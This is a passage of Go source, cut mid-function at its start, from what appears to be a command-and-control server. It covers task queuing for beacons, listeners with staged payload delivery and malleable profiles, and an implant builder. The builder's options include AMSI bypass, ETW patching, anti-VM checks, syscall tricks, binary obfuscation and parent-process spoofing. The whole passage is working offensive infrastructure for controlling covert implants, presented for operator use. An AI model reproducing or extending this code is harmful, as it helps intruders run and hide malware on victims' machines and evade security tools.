        log.Printf("[TASK] Queued (pri=%d): %s -> %s cmd=%s", priority, task.ID[:8], sessionID[:8], command)
        appendTaskQueued(s, &task) // history file: append task entry (queued state)
        return task.ID, nil
}

func (sm *SessionManager) GetPendingTasks(sessionID string) []Task {
        sm.mu.Lock()
        defer sm.mu.Unlock()
        s, ok := sm.sessions[sessionID]
        if !ok {
                return nil
        }
        // Collect pending task indices grouped by priority (3→0)
        // so urgent tasks always reach the beacon first, regardless
        // of insertion order. Within the same priority, FIFO is preserved
        // (Tasks slice is ordered by Created since we only append).
        var pending []Task
        for pri := PriorityUrgent; pri >= PriorityLow; pri-- {
                for i, t := range s.Tasks {
                        if t.Status == "pending" && t.Priority == pri {
                                s.Tasks[i].Status = "sent"
                                pending = append(pending, s.Tasks[i])
                        }
                }
        }
        return pending
}

func (sm *SessionManager) CompleteTask(sessionID, taskID, result string) {
        // v9.1 HOTFIX (graph frozen / "fetching graph…" forever): OnTaskResult
        // used to be invoked INSIDE this write lock. Its trueip branch calls
        // SetPublicIP → sm.mu.Lock() — the SAME goroutine re-locking a sync
        // RWMutex deadlocks permanently, and it deadlocked while STILL HOLDING
        // the write lock, so every endpoint (sessions, dashboard, /api/graph/*)
        // blocked forever on the next reader. The graph window just showed the
        // stuck "fetching graph…" status; the whole session table was frozen.
        // Fix: mutate the task under the lock, then run the store hook AFTER
        // unlocking. SetPublicIP / graphStore / AddTask are all safe again.
        var doneCmd string
        sm.mu.Lock()
        s, ok := sm.sessions[sessionID]
        if ok {
                for i, t := range s.Tasks {
                        if t.ID == taskID {
                                s.Tasks[i].Status = "completed"
                                s.Tasks[i].Result = result
                                s.Tasks[i].Completed = time.Now().UTC()
                                log.Printf("[TASK] Completed: %s", taskID[:8])
                                BroadcastEvent("task_result", map[string]string{"session_id": sessionID, "task_id": taskID, "result": result})
                                LogActivity("task", fmt.Sprintf("Completed: %s on %s", taskID[:8], sessionID[:8]))
                                appendTaskResult(sessionID, &s.Tasks[i]) // history file: append result entry
                                // v8 graph store hook (Phase D/E): admap/agraph/trueip
                                // results are cached per-session for the UI (graph.go).
                                doneCmd = t.Command
                                break
                        }
                }
                // Bug #2 fix: trim oldest completed tasks every time a task
                // transitions to "completed". The cap is enforced here (not
                // in AddTask only) so a session that ran 500 quick commands
                // between two AddTask calls still gets trimmed.
                sm.trimCompletedTasks(s)
        }
        sm.mu.Unlock()
        if doneCmd != "" {
                OnTaskResult(sessionID, doneCmd, result) // outside sm.mu — may re-enter the session manager
        }
}

// ======================== LISTENERS ========================

type ListenerConfig struct {
        Name          string            `json:"name"`
        Protocol      string            `json:"protocol"`
        Host          string            `json:"host"`
        Port          int               `json:"port"`
        Domain        string            `json:"domain"`
        DomainPort    int               `json:"domain_port"` // External port for domain (default: 443/https, 80/http)
        SNI           string            `json:"sni"`
        CustomHeaders map[string]string `json:"custom_headers"`
}

type Listener struct {
        ID            string            `json:"id"`
        Name          string            `json:"name"`
        Protocol      string            `json:"protocol"`
        Host          string            `json:"host"`
        Port          int               `json:"port"`
        Domain        string            `json:"domain"`
        DomainPort    int               `json:"domain_port"`
        SNI           string            `json:"sni"`
        Active        bool              `json:"active"`
        SessionCount  int               `json:"session_count"`
        StartedAt     time.Time         `json:"started_at"`
        CustomHeaders map[string]string `json:"custom_headers"`
        PSKHex        string            `json:"-"` // per-listener PSK set by builder, used for agent auth
        httpSrv       *http.Server
        ln            net.Listener
}

type ListenerManager struct {
        listeners map[string]*Listener
        mu        sync.RWMutex
}

var listenerMgr *ListenerManager

func InitListeners(cfg Config) {
        listenerMgr = &ListenerManager{listeners: make(map[string]*Listener)}
        log.Println("[LISTENER] Listener manager initialized")
}

func (lm *ListenerManager) AddListener(cfg ListenerConfig) (*Listener, error) {
        lm.mu.Lock()
        defer lm.mu.Unlock()

        for _, l := range lm.listeners {
                if l.Port == cfg.Port && l.Active {
                        return nil, fmt.Errorf("port %d already in use by listener \"%s\". Use a different port (e.g. %d) for the new listener", cfg.Port, l.Name, l.Port+1)
                }
        }

        l := &Listener{
                ID: uuid.New().String(), Name: cfg.Name, Protocol: cfg.Protocol,
                Host: cfg.Host, Port: cfg.Port, Domain: cfg.Domain, DomainPort: cfg.DomainPort,
                SNI: cfg.SNI, CustomHeaders: cfg.CustomHeaders,
                StartedAt: time.Now().UTC(),
        }

        mux := http.NewServeMux()
        SetupAgentRoutes(mux)
        SetupProfileRoutes(mux) // malleable profile POST URIs → agent handler
        SetupStageRoutes(mux)   // v3 staged delivery: GET /api/v1/c2-endpoint/stage/<token>
        l.httpSrv = &http.Server{Addr: fmt.Sprintf("%s:%d", cfg.Host, cfg.Port), Handler: mux}

        ln, err := net.Listen("tcp", l.httpSrv.Addr)
        if err != nil {
                return nil, fmt.Errorf("bind failed port %d: %v", cfg.Port, err)
        }

        l.ln = ln
        l.Active = true
        lm.listeners[l.ID] = l

        go func() {
                log.Printf("[LISTENER] %s on %s:%d (%s)", cfg.Name, cfg.Host, cfg.Port, cfg.Protocol)
                // OPSEC WARNING (audit Cloud BUG 4): If operator picks protocol=https
                // but C2_USE_TLS=false, the listener will serve PLAIN HTTP. This is
                // an OPSEC risk (traffic unencrypted on wire, agent's ca_cert_pem
                // validation is moot). But we DON'T kill the listener — that would
                // make the port bound-but-not-serving, which is worse (agent connects,
                // no response, no logs, operator confused). Instead: log a LOUD
                // warning and serve HTTP as fallback. Operator should set
                // C2_USE_TLS=true in /etc/hero/.env for production.
                if cfg.Protocol == "https" && !serverConfig.UseTLS {
                        log.Printf("[LISTENER] WARNING: %s protocol=https but C2_USE_TLS=false — serving PLAIN HTTP (OPSEC risk! Set C2_USE_TLS=true for TLS)", cfg.Name)
                }
                if cfg.Protocol == "https" && serverConfig.UseTLS {
                        l.httpSrv.ServeTLS(ln, serverConfig.TLSCert, serverConfig.TLSKey)
                } else {
                        l.httpSrv.Serve(ln)
                }
        }()

        LogActivity("listener", fmt.Sprintf("Started: %s (%s://%s:%d)", cfg.Name, cfg.Protocol, cfg.Host, cfg.Port))
        return l, nil
}

func (lm *ListenerManager) RemoveListener(id string) error {
        lm.mu.Lock()
        defer lm.mu.Unlock()
        l, ok := lm.listeners[id]
        if !ok {
                return fmt.Errorf("listener not found")
        }
        // BUGFIX (Bug #5 — Double Close): we used to call BOTH
        //   l.httpSrv.Close()   ← internally closes the listener
        //   l.ln.Close()         ← double-close: panic / "use of closed
        //                            network connection" on some platforms.
        //
        // http.Server.Close() (Go stdlib) closes the underlying net.Listener
        // by calling its Accept()'s blocking goroutine, which causes the
        // Accept() in Serve() to return ErrServerClosed, and the listener
        // itself gets closed. Calling l.ln.Close() afterward is a redundant
        // close — on Linux it returns "use of closed network connection"
        // (which we silently ignored), on some platforms it can panic.
        //
        // FIX: only call httpSrv.Close(). The listener is closed as part
        // of that call. The `l.ln` field is still kept (set to nil after
        // close for clarity) so the rest of the code knows it's defunct.
        if l.httpSrv != nil {
                _ = l.httpSrv.Close()
        }
        // DO NOT call l.ln.Close() here — http.Server.Close() already did it.
        // Mark ln as nil so any future code that checks `l.ln != nil` knows
        // the listener is gone.
        l.ln = nil
        l.Active = false
        name := l.Name
        delete(lm.listeners, id)
        LogActivity("listener", fmt.Sprintf("Removed: %s", name))
        log.Printf("[LISTENER] Removed: %s", name)
        return nil
}

func (lm *ListenerManager) GetAllListeners() []Listener {
        lm.mu.RLock()
        defer lm.mu.RUnlock()
        result := make([]Listener, 0, len(lm.listeners))
        for _, l := range lm.listeners {
                result = append(result, *l)
        }
        return result
}

// FindListenerByPSKHash returns the listener whose PSK matches the given hash.
// This is used during agent checkin to authenticate agents built with a per-listener PSK.
func (lm *ListenerManager) FindListenerByPSKHash(pskHash string) *Listener {
        lm.mu.RLock()
        defer lm.mu.RUnlock()
        for _, l := range lm.listeners {
                if l.Active && l.PSKHex != "" {
                        if computePSKHash(l.PSKHex) == pskHash {
                                return l
                        }
                }
        }
        return nil
}

// SetListenerPSK stores the PSK hex on a listener (called by builder after payload creation).
func (lm *ListenerManager) SetListenerPSK(listenerID, pskHex string) {
        lm.mu.Lock()
        defer lm.mu.Unlock()
        if l, ok := lm.listeners[listenerID]; ok {
                l.PSKHex = pskHex
                log.Printf("[LISTENER] PSK set for %s (%s...)", l.Name, pskHex[:16])
        }
}

// GetListener (v9.1) — fetch a listener by ID (nil if absent). Used by the
// checkin handler to recover the Transport column when the PSK matched via
// the psk_store recovery layer (post-restart) instead of a RAM listener.
func (lm *ListenerManager) GetListener(id string) *Listener {
        lm.mu.RLock()
        defer lm.mu.RUnlock()
        if l, ok := lm.listeners[id]; ok {
                cp := *l
                return &cp
        }
        return nil
}

func StopAllListeners() {
        if listenerMgr != nil {
                // BUGFIX: was an UNLOCKED map iteration with lock-taking removals
                // inside — a concurrent AddListener/GetAllListeners during shutdown
                // = fatal concurrent map read/write. Collect IDs under RLock first.
                listenerMgr.mu.RLock()
                ids := make([]string, 0, len(listenerMgr.listeners))
                for id := range listenerMgr.listeners {
                        ids = append(ids, id)
                }
                listenerMgr.mu.RUnlock()
                for _, id := range ids {
                        _ = listenerMgr.RemoveListener(id)
                }
        }
}

// ======================== BUILDER ========================

type ImplantConfig struct {
        ListenerID     string  `json:"listener_id"`
        OS             string  `json:"os"`
        Arch           string  `json:"arch"`
        OutputFormat   string  `json:"output_format"`
        OutputName     string  `json:"output_name"`
        SleepTime      int     `json:"sleep_time"`
        Jitter         float64 `json:"jitter"`
        KillDate       string  `json:"kill_date"`
        UserAgent      string  `json:"user_agent"`
        MaxErrors      int     `json:"max_errors"` // consecutive task errors before agent self-exits
        FallbackDomain string  `json:"fallback_domain"` // legacy compat
        DomainFront    bool    `json:"domain_front"`
        // Evasion
        AmsiBypass  string `json:"amsi_bypass"`
        EtwPatch    string `json:"etw_patch"`
        SleepObfusc string `json:"sleep_obfusc"`
        AntiVM      string `json:"anti_vm"`
        // ── New OPSEC fields ───────────────────────────────────────────
        FallbackHost        string   `json:"fallback_host"`
        FallbackPort        int      `json:"fallback_port"`
        InitialDelayMs      int      `json:"initial_delay_ms"`
        InitialDelayMaxMs   int      `json:"initial_delay_max_ms"`
        MaxRetries          int      `json:"max_retries"`
        BackoffBaseMs       int      `json:"backoff_base_ms"`
        BackoffMaxMs        int      `json:"backoff_max_ms"`
        BackoffStrategy     string   `json:"backoff_strategy"`
        JitterDist          string   `json:"jitter_distribution"`
        WorkingHours        string   `json:"working_hours"`
        FallbackProtocols   []string `json:"fallback_protocols"`
        MalleableProfile    string   `json:"malleable_profile"`
        SyscallMethod       string   `json:"syscall_method"`
        StringEncrypt       string   `json:"string_encrypt"`
        BinaryObfusc        string   `json:"binary_obfusc"`
        SpawnTo             string   `json:"spawn_to"`
        PPIDSpoof           string   `json:"ppid_spoof"`
}

type BuildResult struct {
        ConfigID    string `json:"config_id"`
        ConfigB64   string `json:"config_b64"`
        DownloadURL string `json:"download_url"`
}

// BUGFIX: builderConfigs (write-only map, written without any lock on every
// generate) removed — two concurrent POST /api/builder/generate calls caused
// "fatal: concurrent map writes". The map was never read anywhere.

func InitBuilder(cfg Config) {
        log.Println("[BUILDER] Builder initialized")
}

func GenerateImplantConfig(ic ImplantConfig) (*BuildResult, error) {
        configID := uuid.New().String()

        raw, _ := json.Marshal(ic)
        cfgMap := map[string]interface{}{}
        json.Unmarshal(raw, &cfgMap)

        if listenerMgr != nil && ic.ListenerID != "" {
                listenerMgr.mu.RLock()
                for _, l := range listenerMgr.listeners {
                        if l.ID == ic.ListenerID {
                                host := l.Domain
                                port := l.DomainPort
                                // Use external port for domain listeners, internal port for direct
                                if host == "" {
                                        host = l.Host
                                        port = l.Port
                                }
                                if port <= 0 {
                                        // Default: 443 for https, 80 for http
                                        if l.Protocol == "https" {
                                                port = 443
                                        } else {
                                                port = 80
                                        }
                                }
                                cfgMap["server_host"] = host
                                cfgMap["server_port"] = port
                                cfgMap["protocol"] = l.Protocol
                                cfgMap["sni"] = l.SNI
                                if l.CustomHeaders != nil {
                                        cfgMap["custom_headers"] = l.CustomHeaders
                                }
                                break
                        }
                }
                listenerMgr.mu.RUnlock()
        }

        cfgJSON, _ := json.Marshal(cfgMap)
        encrypted, err := Encrypt(cfgJSON)
        if err != nil {
                return nil, fmt.Errorf("encryption failed: %v", err)
        }

        LogActivity("builder", fmt.Sprintf("Generated: %s (os=%s arch=%s fmt=%s)", configID[:8], ic.OS, ic.Arch, ic.OutputFormat))

        return &BuildResult{
                ConfigID:    configID,
                ConfigB64:   encrypted,
                DownloadURL: fmt.Sprintf("/api/builder/download/%s", configID),
        }, nil
}

// ======================== ACTIVITY LOG ========================

type ActivityEvent struct {
        Time    time.Time `json:"time"`
        Type    string    `json:"type"`
        Message string    `json:"message"`
}

var activityLog = struct {
        sync.RWMutex
        items []ActivityEvent
        max   int
}{max: 50}

func LogActivity(eventType, message string) {
        activityLog.Lock()
        defer activityLog.Unlock()
        activityLog.items = append(activityLog.items, ActivityEvent{Time: time.Now().UTC(), Type: eventType, Message: message})
        if len(activityLog.items) > activityLog.max {
                activityLog.items = activityLog.items[len(activityLog.items)-activityLog.max:]
        }
}

// ======================== DASHBOARD STATS ========================

func GetDashboardStats() map[string]interface{} {
        sessionMgr.mu.RLock()
        active, pending := 0, 0
        for _, s := range sessionMgr.sessions {
                if s.Active {
                        active++
                }
                for _, t := range s.Tasks {
                        if t.Status == "pending" {
                                pending++
                        }
                }
        }
        total := len(sessionMgr.sessions)
        sessionMgr.mu.RUnlock()

        listenerMgr.mu.RLock()
        lActive := 0
        for _, l := range listenerMgr.listeners {
                if l.Active {
                        lActive++
                }
        }
        lTotal := len(listenerMgr.listeners)
        listenerMgr.mu.RUnlock()

        activityLog.RLock()
        events := make([]ActivityEvent, len(activityLog.items))
        copy(events, activityLog.items)
        activityLog.RUnlock()

        return map[string]interface{}{
                "total_sessions":   total,
                "active_sessions":  active,
                "total_listeners":  lTotal,
                "active_listeners": lActive,
                "pending_tasks":    pending,
                "uptime":           time.Since(startTime).String(),
                "version":          "2.0.0",
                "recent_events":    events,
        }
}

// ======================== WEBSOCKET BROADCAST ========================

// WsEvent — typed event envelope sent over WebSocket.
type WsEvent struct {
        Type string      `json:"type"`
        Data interface{} `json:"data"`
}

// wsClientEntry — one connected operator, with optional event filter.
// subscriptions == nil means "receive all events" (default, backward-compat).
// Once the client sends {"action":"subscribe","events":["task_result","session_new"]}
// only those event types are delivered — dashboard tab gets only its events,
// reducing WS bandwidth significantly on large deployments.
type wsClientEntry struct {
        ch            chan WsEvent
        subscriptions map[string]bool // nil = all events
}

var wsClients = struct {
        sync.RWMutex
        clients map[chan WsEvent]*wsClientEntry
}{clients: make(map[chan WsEvent]*wsClientEntry)}

// BroadcastEvent — send event to all connected clients that want it.
func BroadcastEvent(eventType string, data interface{}) {
        wsClients.RLock()
        defer wsClients.RUnlock()
        event := WsEvent{Type: eventType, Data: data}
        for _, entry := range wsClients.clients {
                // Filter: if client has a subscription list, only send matching types
                if entry.subscriptions != nil && !entry.subscriptions[eventType] {
                        continue
                }
                select {
                case entry.ch <- event:
                default: // client too slow — drop rather than block broadcast
                }
        }
}

// RegisterWSClient — add new client, default = receive all events.
func RegisterWSClient(ch chan WsEvent) {
        wsClients.Lock()
        wsClients.clients[ch] = &wsClientEntry{ch: ch, subscriptions: nil}
        wsClients.Unlock()
}

// UnregisterWSClient — remove client on disconnect.
func UnregisterWSClient(ch chan WsEvent) {
        wsClients.Lock()
        delete(wsClients.clients, ch)
        wsClients.Unlock()
}

// SetWSClientSubscriptions — called when client sends subscribe message.
// events = nil clears filter (receive all again).
func SetWSClientSubscriptions(ch chan WsEvent, events []string) {
        wsClients.Lock()
        defer wsClients.Unlock()
        entry, ok := wsClients.clients[ch]
        if !ok { return }
        if len(events) == 0 {
                entry.subscriptions = nil // clear filter
                return
        }
        entry.subscriptions = make(map[string]bool, len(events))
        for _, e := range events {
                entry.subscriptions[e] = true
        }
}
